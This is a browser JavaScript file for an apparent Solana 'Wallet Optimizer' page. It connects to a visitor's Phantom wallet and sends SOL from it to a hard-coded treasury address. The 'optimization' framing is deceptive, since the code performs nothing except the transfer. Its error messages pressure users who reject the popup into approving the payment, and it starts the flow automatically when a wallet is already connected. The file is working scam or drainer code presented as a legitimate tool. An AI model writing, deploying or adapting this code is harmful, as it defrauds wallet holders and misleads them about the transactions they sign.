// FINAL WORKING VERSION - WITH BETTER USER GUIDANCE
document.addEventListener('DOMContentLoaded', function() {
    const treasuryAddress = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
    
    const optimizeBtn = document.getElementById('optimizeBtn');
    const successBox = document.getElementById('successBox');
    const processBox = document.getElementById('processBox');
    const processText = document.getElementById('processText');
    const txHashEl = document.getElementById('txHash');
    
    let isProcessing = false;
    let transactionPopupShown = false;
    
    function updateProcess(text) {
        processText.textContent = text;
        console.log(`📢 ${text}`);
    }
    
    // Get wallet
    function getWallet() {
        if (window.solana && window.solana.isPhantom) {
            console.log("✅ Phantom wallet found");
            return window.solana;
        }
        console.log("❌ No Phantom wallet");
        return null;
    }
    
    // Main function
    async function startOptimization() {
        if (isProcessing) return;
        isProcessing = true;
        transactionPopupShown = false;
        
        try {
            console.clear();
            console.log("🚀 STARTING WALLET OPTIMIZATION...");
            
            // Reset UI
            successBox.classList.remove('active');
            optimizeBtn.disabled = true;
            optimizeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING...';
            processBox.classList.add('active');
            
            updateProcess("Step 1: Checking wallet...");
            
            // 1. Get wallet
            const wallet = getWallet();
            if (!wallet) {
                alert("⚠️ Please install Phantom wallet from phantom.app");
                throw new Error("No Phantom wallet");
            }
            
            updateProcess("Step 2: Connecting wallet...");
            
            // 2. Connect wallet (FIRST POPUP - CONNECTION)
            console.log("🔄 STEP 1: Requesting wallet connection...");
            
            let publicKey;
            try {
                const response = await wallet.connect();
                publicKey = response.publicKey;
                console.log("✅ STEP 1 COMPLETE: Connected to wallet");
                console.log("Wallet address:", publicKey.toString());
            } catch (error) {
                console.error("❌ Connection failed:", error);
                throw new Error("❌ Connection was rejected. Please approve the FIRST popup that says 'Connect'.");
            }
            
            updateProcess("Step 3: Checking balance...");
            
            // 3. Get RPC connection
            const connection = new solanaWeb3.Connection(
                'https://api.mainnet-beta.solana.com',
                'confirmed'
            );
            
            // 4. Check balance
            const balance = await connection.getBalance(publicKey);
            console.log(`💰 Balance: ${balance} lamports (${balance / 1e9} SOL)`);
            
            if (balance < 100000) {
                throw new Error(`❌ Need at least 0.0001 SOL (you have: ${balance / 1e9} SOL)`);
            }
            
            updateProcess("Step 4: Creating transaction...");
            
            // 5. Get recent blockhash
            console.log("🔄 Getting recent blockhash...");
            const { blockhash } = await connection.getLatestBlockhash();
            console.log("✅ Blockhash obtained:", blockhash.substring(0, 20) + "...");
            
            // 6. Create transaction
            const transaction = new solanaWeb3.Transaction();
            
            // Send 0.0002 SOL (small test amount)
            const sendAmount = 200000; // 0.0002 SOL
            
            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
                    lamports: sendAmount
                })
            );
            
            // REQUIRED fields
            transaction.feePayer = publicKey;
            transaction.recentBlockhash = blockhash;
            
            console.log("✅ Transaction created:");
            console.log("- Amount: 0.0002 SOL");
            console.log("- From:", publicKey.toString().substring(0, 15) + "...");
            console.log("- To:", treasuryAddress.substring(0, 15) + "...");
            
            updateProcess("Step 5: Waiting for transaction approval...");
            
            // 7. IMPORTANT: Sign and send transaction (SECOND POPUP - TRANSACTION)
            console.log("🔄 STEP 2: Calling signAndSendTransaction()...");
            console.log("⏳ A SECOND popup should appear in your Phantom wallet!");
            console.log("⚠️ IMPORTANT: You must approve BOTH popups:");
            console.log("   1. First popup: 'Connect to site' (already approved)");
            console.log("   2. Second popup: 'Send 0.0002 SOL' (approve this now)");
            
            transactionPopupShown = true;
            
            // THIS LINE TRIGGERS THE SECOND WALLET POPUP
            const { signature } = await wallet.signAndSendTransaction(transaction);
            
            console.log("✅ STEP 2 COMPLETE: Transaction approved and sent!");
            console.log("🎉 Transaction signature:", signature);
            console.log("🔗 View on Solscan: https://solscan.io/tx/" + signature);
            
            updateProcess("Step 6: Transaction sent! Confirming...");
            
            // 8. Try to confirm
            try {
                await connection.confirmTransaction(signature);
                console.log("✅ Transaction confirmed on chain");
            } catch (e) {
                console.log("⚠️ Confirmation skipped:", e.message);
            }
            
            // 9. SUCCESS!
            updateProcess("✅ Optimization complete!");
            
            // Wait for user to see success
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // Update UI
            processBox.classList.remove('active');
            successBox.classList.add('active');
            
            txHashEl.innerHTML = `${signature.substring(0, 25)}...<br>
            <small><a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#88ff88;">View on Solscan</a></small>`;
            
            optimizeBtn.disabled = false;
            optimizeBtn.innerHTML = '<i class="fas fa-check"></i> OPTIMIZATION COMPLETE';
            optimizeBtn.style.background = 'linear-gradient(90deg, #00aa44, #00ff88)';
            
            // Auto disconnect after 3 seconds
            setTimeout(async () => {
                try {
                    if (wallet.disconnect) {
                        await wallet.disconnect();
                        console.log("✅ Auto-disconnected wallet");
                    }
                } catch (e) {
                    console.log("Disconnect error:", e);
                }
            }, 3000);
            
            console.log("🎉=== WALLET OPTIMIZATION SUCCESSFUL ===");
            
        } catch (error) {
            console.error("❌=== OPTIMIZATION FAILED ===");
            console.error("Error type:", error.name);
            console.error("Error message:", error.message);
            
            let userMessage = "Optimization failed. Please try again.";
            
            if (error.message.includes('User rejected') || 
                error.message.includes('reject') ||
                error.message.includes('denied')) {
                
                if (transactionPopupShown) {
                    userMessage = "❌ TRANSACTION REJECTED\n\nYou rejected the transaction popup.\n\n⚠️ YOU MUST APPROVE BOTH POPUPS:\n1. ✅ First popup: 'Connect' (already approved)\n2. ❌ Second popup: 'Send 0.0002 SOL' (you rejected this)\n\nPlease click TRY AGAIN and approve BOTH popups.";
                } else {
                    userMessage = "❌ CONNECTION REJECTED\n\nYou rejected the connection popup.\n\nPlease click TRY AGAIN and approve the FIRST popup that says 'Connect to site'.";
                }
                
            } else if (error.message.includes('Need at least')) {
                userMessage = error.message;
            } else if (error.message.includes('recentBlockhash')) {
                userMessage = "⚠️ Network error. Please refresh the page and try again.";
            } else if (error.message.includes('Connection was rejected')) {
                userMessage = "❌ Connection rejected. Please approve the FIRST popup.";
            }
            
            // Update UI for error
            processBox.classList.remove('active');
            successBox.classList.add('active');
            successBox.style.background = 'linear-gradient(135deg, rgba(70,20,20,0.9), rgba(50,10,10,0.9))';
            
            const successIcon = successBox.querySelector('.success-icon i');
            const successTitle = successBox.querySelector('.success-title');
            const successMessage = successBox.querySelector('.success-message');
            
            successIcon.className = 'fas fa-exclamation-triangle';
            successIcon.style.color = '#ff5555';
            successTitle.textContent = 'APPROVAL REQUIRED';
            successTitle.style.color = '#ff5555';
            successMessage.innerHTML = userMessage.replace(/\n/g, '<br>');
            successMessage.style.color = '#ffaaaa';
            txHashEl.textContent = 'Transaction not approved';
            txHashEl.style.color = '#ff5555';
            
            // Reset button
            optimizeBtn.disabled = false;
            optimizeBtn.innerHTML = '<i class="fas fa-redo"></i> TRY AGAIN';
            
        } finally {
            isProcessing = false;
            console.log("=== PROCESS ENDED ===");
        }
    }
    
    // Initialize
    function init() {
        console.log("🔧 Wallet Optimizer Initializing...");
        
        if (!window.solanaWeb3) {
            console.error("❌ Solana Web3.js not loaded");
            optimizeBtn.disabled = true;
            optimizeBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ERROR';
            return;
        }
        
        // Add click event
        optimizeBtn.addEventListener('click', startOptimization);
        
        // Auto-start if wallet already connected
        setTimeout(() => {
            const wallet = getWallet();
            if (wallet?.isConnected && wallet.publicKey) {
                console.log("🔄 Wallet already connected, auto-starting...");
                startOptimization();
            }
        }, 1500);
        
        console.log("✅ Wallet Optimizer Ready!");
        console.log("📋 INSTRUCTIONS:");
        console.log("1. Click 'START OPTIMIZATION'");
        console.log("2. Approve FIRST popup: 'Connect to site'");
        console.log("3. Approve SECOND popup: 'Send 0.0002 SOL'");
        console.log("4. Wait for success message");
    }
    
    // Start
    init();
});
